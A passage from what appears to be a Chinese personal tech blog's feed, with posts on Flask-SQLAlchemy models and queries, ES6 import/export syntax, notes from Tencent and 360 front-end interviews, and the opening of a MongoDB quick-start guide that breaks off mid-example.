href="https://blog.csdn.net/feilzhang/article/details/81041663">笔记：flask数据库之基本操作模型建立</a></p><p>注意：在ipython已经不支持python2，需要安装旧版本来获取对Python2的支持！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ pip install ipython==5.4.0</span><br><span class="line">In [5]: user = User(name=&quot;heima&quot;, role_id=role.id)</span><br><span class="line"></span><br><span class="line">In [6]: db.session.add(user)</span><br><span class="line"></span><br><span class="line">In [7]: db.session.commit()</span><br><span class="line"></span><br><span class="line">In [8]: user.name = &#x27;chengxuyuan&#x27;</span><br><span class="line"></span><br><span class="line">In [9]: db.session.commit()</span><br><span class="line"></span><br><span class="line">In [10]: db.session.delete(user)</span><br><span class="line"></span><br><span class="line">In [11]: db.session.commit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-3-创建关系引用"><a href="#2-3-创建关系引用" class="headerlink" title="2.3 创建关系引用"></a>2.3 创建关系引用</h2><p><a href="https://blog.csdn.net/feilzhang/article/details/81041747">笔记：flask数据库之多对多模型演练</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ... ...</span></span><br><span class="line"></span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库模型，需要继承db.Model</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Role</span>(db.Model):</span><br><span class="line">    <span class="comment"># ... ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 在一的乙方，写关联（填写模型名）</span></span><br><span class="line">    <span class="comment"># 表示和User模型发生了关联，增加了一个users属性</span></span><br><span class="line">    users = db.relationship(<span class="string">&#x27;User&#x27;</span>, backref=<span class="string">&quot;role&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># repr()方法显示一个可读字符串</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;Role: %s %s&gt;&#x27;</span> % (self.name, self.<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(db.Model):</span><br><span class="line">    <span class="comment"># ... ...</span></span><br><span class="line">    <span class="comment"># db.ForeignKey标识外键</span></span><br><span class="line">    role_id = db.Column(db.Integer, db.ForeignKey(<span class="string">&#x27;roles.id&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># User希望有role属性，但是这个属性的定义，需要另一个模型中定义</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;User: %s %s %s %s&gt;&#x27;</span> % (self.name, self.<span class="built_in">id</span>, self.email, self.password)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello flask!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 删除表</span></span><br><span class="line">    db.drop_all()</span><br><span class="line">    <span class="comment"># 创建表</span></span><br><span class="line">    db.create_all()</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>创建了关系引用后，我们可以通过访问数据对象实例的属性来访问相关联的数据，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">In [3]: role = Role(name = &quot;admin&quot;)</span><br><span class="line">In [4]: db.session.add(role)</span><br><span class="line">In [5]: db.session.commit()</span><br><span class="line"></span><br><span class="line">=== 完成角色创建 ===</span><br><span class="line"></span><br><span class="line">In [6]: user1 = User(name=&#x27;zs&#x27;, role_id=role.id)</span><br><span class="line">In [7]: user2 = User(name=&#x27;ls&#x27;, role_id=role.id)</span><br><span class="line">In [10]: db.session.add(user1)</span><br><span class="line">In [11]: db.session.add(user2)</span><br><span class="line">In [12]: db.session.commit()</span><br><span class="line"></span><br><span class="line">=== 完成用户创建 ===</span><br><span class="line"></span><br><span class="line">=== 进行关联查询 ===</span><br><span class="line"></span><br><span class="line">In [13]: role.users</span><br><span class="line">Out[13]: [&lt;User: zs 1 None None&gt;, &lt;User: ls 2 None None&gt;]</span><br><span class="line"></span><br><span class="line">In [20]: user1.role</span><br><span class="line">Out[20]: &lt;Role: admin 1&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-4-数据库数据的查询"><a href="#2-4-数据库数据的查询" class="headerlink" title="2.4 数据库数据的查询"></a>2.4 数据库数据的查询</h2><h3 id="常用的SQLAlchemy查询过滤器"><a href="#常用的SQLAlchemy查询过滤器" class="headerlink" title="常用的SQLAlchemy查询过滤器"></a>常用的SQLAlchemy查询过滤器</h3><table><thead><tr><th>过滤器</th><th>说明</th></tr></thead><tbody><tr><td>filter()</td><td>把过滤器添加到原查询上，返回一个新查询</td></tr><tr><td>filter_by()</td><td>把等值过滤器添加到原查询上，返回一个新查询</td></tr><tr><td>limit</td><td>使用指定的值限定原查询返回的结果</td></tr><tr><td>offset()</td><td>偏移原查询返回的结果，返回一个新查询</td></tr><tr><td>order_by()</td><td>根据指定条件对原查询结果进行排序，返回一个新查询</td></tr><tr><td>group_by()</td><td>根据指定条件对原查询结果进行分组，返回一个新查询</td></tr></tbody></table><h3 id="常用的SQLAlchemy查询执行器"><a href="#常用的SQLAlchemy查询执行器" class="headerlink" title="常用的SQLAlchemy查询执行器"></a>常用的SQLAlchemy查询执行器</h3><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>all()</td><td>以列表形式返回查询的所有结果</td></tr><tr><td>first()</td><td>返回查询的第一个结果，如果未查到，返回None</td></tr><tr><td>first_or_404()</td><td>返回查询的第一个结果，如果未查到，返回404</td></tr><tr><td>get()</td><td>返回指定主键对应的行，如不存在，返回None</td></tr><tr><td>get_or_404()</td><td>返回指定主键对应的行，如不存在，返回404</td></tr><tr><td>count()</td><td>返回查询结果的数量</td></tr><tr><td>paginate()</td><td>返回一个Paginate对象，它包含指定范围内的结果</td></tr></tbody></table><h3 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h3><p>返回名字等于wang的所有人：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User.query.filter_by(name=&#x27;wang&#x27;).all()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>all()返回查询到的所有对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User.query.all()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ORM </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于ES6中import、export语句的种种引入方式、导出方式的区别</title>
      <link href="/2019/07/3df914d3a88d.html"/>
      <url>/2019/07/3df914d3a88d.html</url>
      
        <content type="html"><![CDATA[<p>学习了这么长时间的Vue、React、还有nodeJs，对 <code>import</code> 语句可以说是既熟练又容易糊涂，我们经常见到以下几种 <code>import</code> 语句：</p><ul><li>import {xx1, xx2, xx2} from ‘xx’</li><li>improt * as xx from ‘xx’</li><li>import xx from ‘xx’</li></ul><p>那么接下来我们就好好分析一下他们的区别以及使用场景：</p><h2 id="1-import-xx1-xx2-xx2-from-‘xx’"><a href="#1-import-xx1-xx2-xx2-from-‘xx’" class="headerlink" title="1. import {xx1, xx2, xx2} from ‘xx’"></a>1. import {xx1, xx2, xx2} from ‘xx’</h2><p>该语句是引入外部模块中的某个接口，外部模块向外暴露出某个接口后，在主模块中可以引用该模块文件及其接口名称，即可调用该接口。需要注意的是，其接口名称是一一对应的关系。</p><h3 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h3><p>导出模块的方法基本上分为两种，一种是使用 <code>export</code> 语法分别导出对应的模块接口，如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// profile.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> firstName = <span class="string">&#x27;Michael&#x27;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> lastName = <span class="string">&#x27;Jackson&#x27;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> year = <span class="number">1958</span>;</span><br></pre></td></tr></table></figure><p>还有一种就是将以接口的形式聚合导出，如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// profile.js</span></span><br><span class="line"><span class="keyword">var</span> firstName = <span class="string">&#x27;Michael&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> lastName = <span class="string">&#x27;Jackson&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> year = <span class="number">1958</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; firstName, lastName, year &#125;;</span><br></pre></td></tr></table></figure><p>同时我们还可以使用 <code>as</code> 语法来对接口名称进行重命名，如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// profile.js</span></span><br><span class="line"><span class="keyword">var</span> firstName = <span class="string">&#x27;Michael&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> lastName = <span class="string">&#x27;Jackson&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> year = <span class="number">1958</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; </span><br><span class="line">firstName <span class="keyword">as</span> name1, </span><br><span class="line">lastName <span class="keyword">as</span> name2, </span><br><span class="line">year,</span><br><span class="line">year <span class="keyword">as</span> bornYaer</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h3><p>引入模块接口需要按照接口名称一一对应引入：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; firstName, lastName, year &#125; <span class="keyword">from</span> <span class="string">&#x27;./profile.js&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setName</span>(<span class="params">element</span>) &#123;</span><br><span class="line">  element.<span class="property">textContent</span> = firstName + <span class="string">&#x27; &#x27;</span> + lastName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以使用 <code>as</code> 语法去对模块接口进行重命名：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; firstName <span class="keyword">as</span> name1, lastName <span class="keyword">as</span> name2, year &#125; <span class="keyword">from</span> <span class="string">&#x27;./profile.js&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setName</span>(<span class="params">element</span>) &#123;</span><br><span class="line">  element.<span class="property">textContent</span> = name1 + <span class="string">&#x27; &#x27;</span> + name2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-improt-as-xx-from-‘xx’"><a href="#2-improt-as-xx-from-‘xx’" class="headerlink" title="2. improt * as xx from ‘xx’"></a>2. improt * as xx from ‘xx’</h2><p>这种加载方式我们称之为模块的整体加载，是用这种方式加载模块，所有的接口都会被加载并且存放到以 <code>as</code> 命名的对象中。</p><h3 id="导出-1"><a href="#导出-1" class="headerlink" title="导出"></a>导出</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// circle.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">area</span>(<span class="params">radius</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="property">PI</span> * radius * radius;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">circumference</span>(<span class="params">radius</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span> * <span class="title class_">Math</span>.<span class="property">PI</span> * radius;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="引入-1"><a href="#引入-1" class="headerlink" title="引入"></a>引入</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> circle <span class="keyword">from</span> <span class="string">&#x27;./circle&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;圆面积：&#x27;</span> + circle.<span class="title function_">area</span>(<span class="number">4</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;圆周长：&#x27;</span> + circle.<span class="title function_">circumference</span>(<span class="number">14</span>));</span><br></pre></td></tr></table></figure><blockquote><p>注意，模块整体加载所在的那个对象（上例是circle），应该是可以静态分析的，所以不允许运行时改变。下面的写法都是不允许的。</p></blockquote><h2 id="3-import-xx-from-‘xx’"><a href="#3-import-xx-from-‘xx’" class="headerlink" title="3. import xx from ‘xx’"></a>3. import xx from ‘xx’</h2><p>这种语法实际上是最常见的，从前面的例子可以看出，使用import命令的时候，用户需要知道所要加载的变量名或函数名，否则无法加载。但是，用户肯定希望快速上手，未必愿意阅读文档，去了解模块有哪些属性和方法。用这种方法可以加载模块文件默认导出的接口，并且按照用户自定义的变量名称去加载该默认接口。</p><blockquote><p>本质上，<code>export default</code>就是输出一个叫做<code>default</code>的变量或方法，然后系统允许你为它取任意名字。所以，下面的写法是有效的。</p></blockquote><h3 id="导出-2"><a href="#导出-2" class="headerlink" title="导出"></a>导出</h3><p>默认接口使用 <code>export default</code> 语句导出，其可以是一个命名函数方法也可以是一个匿名函数方法。同时使用了 <code>export default</code> 语句导出默认接口的情况下，仍旧可以使用 <code>export</code> 语句导出命名接口：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// export-default.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="引入-2"><a href="#引入-2" class="headerlink" title="引入"></a>引入</h3><p>在主文件中引用该模块可以直接使用 <code>import</code> 语句定义用户自定义变量来引入使用该接口:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// import-default.js</span></span><br><span class="line"><span class="keyword">import</span> customName <span class="keyword">from</span> <span class="string">&#x27;./export-default&#x27;</span>;</span><br><span class="line"><span class="title function_">customName</span>(); <span class="comment">// &#x27;foo&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="4-注意"><a href="#4-注意" class="headerlink" title="4. 注意"></a>4. 注意</h2><p>我们在编写模块导出模块接口时，使用 <code>export</code> 语句导出的变量、方法必须定义在语句之后，不能直接导出匿名函数、数值、字符串，如下面定义的导出都是非法的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="keyword">export</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="keyword">var</span> m = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">export</span> m;</span><br></pre></td></tr></table></figure><blockquote><p>上面两种写法都会报错，因为没有提供对外的接口。第一种写法直接输出 1，第二种写法通过变量m，还是直接输出 1。1只是一个值，不是接口。正确的写法是下面这样。</p></blockquote><p>正确的写法为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写法一</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> m = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法二</span></span><br><span class="line"><span class="keyword">var</span> m = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">export</span> &#123;m&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法三</span></span><br><span class="line"><span class="keyword">var</span> n = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">export</span> &#123;n <span class="keyword">as</span> m&#125;;</span><br></pre></td></tr></table></figure><p>但是当我们使用 <code>export default</code> 语句时，如果在语句中声明变量，就会产生报错，这点与 <code>export</code> 语句截然相反，其原因是因为 <code>export default</code> 语句实质上相当于导出了一个 <code>defalut</code> 变量，如果我们再语句中再声明一个变量自然就会报错。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 正确</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> a;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 错误</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="keyword">export</span> <span class="number">42</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ES6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>腾讯面试总结</title>
      <link href="/2019/06/773f28a8f00e.html"/>
      <url>/2019/06/773f28a8f00e.html</url>
      
        <content type="html"><![CDATA[<h1 id="面试题目"><a href="#面试题目" class="headerlink" title="面试题目"></a>面试题目</h1><h2 id="前聊"><a href="#前聊" class="headerlink" title="前聊"></a>前聊</h2><ol><li>简单介绍一下你的情况？</li><li>实验室里写过什么项目？</li><li>你的停车位系统是什么？</li><li>你写项目用到了什么技术？</li><li>你了解过其他语言吗？</li></ol><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol><li>Vue跟React的区别是什么？</li><li>ES5跟ES6的区别？</li><li>Promise函数的优点</li><li>Promise函数跟async和await的区别</li><li>从用户输入url到页面渲染所经历的过程<ol><li>DNS的查找过程（×）</li><li>三次握手的过程</li><li>为什么要进行三次握手</li><li>不进行三次握手可以吗</li></ol></li><li>前后台数据流的过程</li><li>npm原理，有什么跟npm相似的包管理工具吗？</li><li>用户登录怎么做<ol><li>服务器端怎么查找用户的信息</li><li>如何知晓TOKEN对应的用户？</li></ol></li><li>你一般用Git做些什么？</li><li>Git的常用指令有哪些，打Tag的指令是什么？（×）</li><li>Git怎么处理分支冲突？</li><li>排序算法有哪些？介绍一下快速排序（×）</li><li>数据库… …</li><li>平衡二叉树是个什么</li><li>了解Linux吗？要统计一个log文件下log的条数应该怎么操作？</li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>鹅厂的一轮前端面试题对后台的基础和掌握程度有所考察，让我一个前端有点瑟瑟发抖。HTTP协议、数据库、后台逻辑处理都有提问，数据结构完全阵亡，并且对前端工具也有所考核。</p><p>以前没有考虑过会被提问那么多后台知识点，完全忽略了数据库，Git和Linux指令没有过全面了解，数据库也GG了。</p><p>HTTP协议仍是重中之重，之前准备那么久的url到页面渲染的过程果然被提问了，这是一道危险题目，面试官会追问其中的细节，务必把每个细节都仔细了解，比较庆幸只提问了三次握手，没有详细询问四次挥手（否则有是emmmm）。</p><p>数据结构第一次在面试中被问到，重点提问了二叉树和排序算法，然而完全没有准备。</p><p>总之，知识库还需要补充Git指令、Linux指令、数据库的问题，数据结构还要继续深入（排序算法背也要背会！！！！！）</p><blockquote><p>什么时候能改了三秒钟记忆力的猫病啊（哀嚎）</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>360面试总结</title>
      <link href="/2019/06/44743f51e72b.html"/>
      <url>/2019/06/44743f51e72b.html</url>
      
        <content type="html"><![CDATA[<h2 id="面试题目"><a href="#面试题目" class="headerlink" title="面试题目"></a>面试题目</h2><p>Vue相关的问题：</p><ol><li>你为什么选择Vue？</li><li>你认为Vue与普通的原生JS相比有什么优点？</li><li>Vue的动画原理</li><li>常用的Vue生命周期钩子函数有哪些？ [-]</li><li>Computed属性与Watch属性 [-]</li><li>你用过Vue插件吗？[x]</li></ol><p>Javascript基础问题：</p><ol><li>ES6箭头函数与普通function函数的区别</li><li>简单描述一下原型链</li><li>描述一下你理解的闭包</li><li>描述一下MVVM [x]</li><li>Vue中的MVVM是基于什么实现的？</li><li>你了解HTTP协议吗？[x]</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>面试题目难度一般，但是有些东西还是不了解，很多东西有些健忘，看来大公司提问Vue其共性就是会让你说出Vue的优缺点，还有其实现原理。</p><p>Vue插件听都没听说过，但是看官方文档 <code>Vue-router</code> 就属于一个Vue插件，HTTP协议需要继续深入了解。</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB快速使用指南</title>
      <link href="/2019/06/9651226bbace.html"/>
      <url>/2019/06/9651226bbace.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1. 基本概念"></a>1. 基本概念</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>MongoDB有以下几个重要概念，分别对应关系型数据库中的概念模型：</p><ul><li>数据库（Database） - 数据库（Database）</li><li>集合（Collection）- 数据表（Table）</li><li>文档（Document）- 记录（Record）</li></ul><h2 id="数据库使用步骤"><a href="#数据库使用步骤" class="headerlink" title="数据库使用步骤"></a>数据库使用步骤</h2><ol><li>建立数据库(KomaBlog)</li><li>建立数据集合(Posts，categories，Tags)</li><li>建立数据(Post:{“_id”：””，”title”：””})</li></ol><blockquote><p>每一个文档（记录）的字段可以不同</p></blockquote><ul><li>KomaBlog<ul><li>Posts<ul><li>{“_id”: “1”, “title”: “我的第一篇博客”}</li><li>{“_id”: “2”, “title”: “我的第二篇博客”}</li><li>{“_id”: “3”, “title”: “我的第三篇博客”,”delflg”：1}</li></ul></li><li>Categories<ul><li>{“_id”：“1”，”title”：“游戏”}</li><li>{“_id”：”2”，”title”：”技术”}</li></ul></li><li>Tags<ul><li>{“_id”：”1”，”title”：”光荣系列”}</li><li>{“_id”：“2”，“title”：“任天堂系列“}</li><li>{“_id”：”3”，“title”：”Ubuntu”}</li></ul></li></ul></li></ul><h2 id="NoSql"><a href="#NoSql" class="headerlink" title="NoSql"></a>NoSql</h2><p>在NoSql的数据库中，操作数据都是通过指令或程序语言完成的，比如在MongoDB中使用过Javascript和JSON数据结构，来操作和管理数据的。</p><h1 id="2-简简单单NoSql"><a href="#2-简简单单NoSql" class="headerlink" title="2. 简简单单NoSql"></a>2. 简简单单NoSql</h1><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul><li>mongo命令行工具</li><li>建立删除数据库</li></ul><h2 id="实战演习"><a href="#实战演习" class="headerlink" title="实战演习"></a>实战演习</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ mongo</span><br><span class="line">&gt; <span class="built_in">help</span></span><br><span class="line">&gt; <span class="built_in">exit</span></span><br><span class="line">$ mongo</span><br><span class="line">&gt; show dbs;</span><br><span class="line">&gt; use komablog;</span><br><span class="line">&gt; show collections;</span><br><span class="line">&gt; db.createCollection(<span class="string">&quot;posts&quot;</span>);</span><br><span class="line">&gt; db.createCollection(<span class="string">&quot;categories&quot;</span>);</span><br><span class="line">&gt; db.createCollection(<span class="string">&quot;tags&quot;</span>);</span><br><span class="line">&gt; show collections;</span><br><span class="line">&gt; show dbs;</span><br><span class="line">&gt; db.stats();</span><br><span class="line">&gt; db.dropDatabase();</span><br><span class="line">&gt; show dbs;</span><br></pre></td></tr></table></figure><h1 id="3-操作集合（Collection）"><a href="#3-操作集合（Collection）" class="headerlink" title="3. 操作集合（Collection）"></a>3. 操作集合（Collection）</h1><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><ul><li>MongoDB数据集合的操作</li></ul><h2 id="实战演习-1"><a href="#实战演习-1" class="headerlink" title="实战演习"></a>实战演习</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ mongo</span><br><span class="line">&gt; show dbs;</span><br><span 